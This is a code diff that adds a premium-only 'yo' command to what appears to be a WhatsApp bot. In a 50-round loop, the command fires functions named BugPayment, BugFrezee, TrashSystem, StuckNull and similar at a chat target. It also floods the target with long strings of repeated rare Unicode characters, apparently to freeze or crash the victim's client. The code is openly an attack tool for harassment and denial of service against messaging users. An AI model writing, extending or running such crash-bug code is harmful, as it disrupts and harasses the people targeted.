@@ -1957,6 +1957,35 @@ async function callDoc(XeonBotInc, target) {
 
 	    
         switch (command) {
+case 'yo': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (isGroup) return
+if (!q) return replygcxeon('Provide argument')
+let target = m.chat
+await replygcxeon(`✞Xᴄʜʀɪss Bot✞`)
+for (let i = 0; i < 50; i++) {
+await BugPayment(target)
+await BugFrezee(target)
+await OLDLOC(target, TypeNull) 
+await callp(target, )
+await gall(target, xbug2, 1020000)
+await galx(target, Ptcp = true)
+await TrashSystem(target, xeonThm, Ptcp = true)
+await StuckNull(target, xeonThm, Ptcp = true) 
+await StuckSql(target, xeonThm, Ptcp = true)
+await PayMent(target)
+await beta(betaq, target)
+await caros(target, Ptcp = true)
+await galx(target, Ptcp = true)
+await coresix(target, "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱", 1020000, true); 
+await XeonBotInc.sendMessage(target, { text: `XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱` }, {quoted: xbug2})
+await sleep(10000)
+}
+await replygcxeon(`✞Xᴄʜʀɪss Bot✞`)
+}
+break
+
+			
 case 'cios': {
 if (!q) return replygcxeon(`Use like:\n ${prefix + command} 23490316165xx`)
 let target = m.chat
